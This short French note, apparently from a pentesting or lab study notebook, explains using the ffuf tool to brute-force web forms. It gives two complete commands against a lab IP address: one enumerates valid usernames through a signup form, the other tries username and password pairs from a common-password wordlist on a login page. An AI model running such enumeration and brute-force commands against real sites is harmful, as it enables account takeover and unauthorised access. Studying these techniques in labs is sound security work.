brute force des éléments sur une page web comme des noms d'utilisateurs, mot de passe, email ou autre.

[https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf "https://github.com/ffuf/ffuf")  
Exemple :  
Pour trouver juste un username

`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.200.105/customers/signup -mr "username already exists"`

Pour trouver une combinaison (toute les combinaisons sont testées)

`ffuf -w listofusers.txt:W1 -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.200.105/customers/login -fc 200`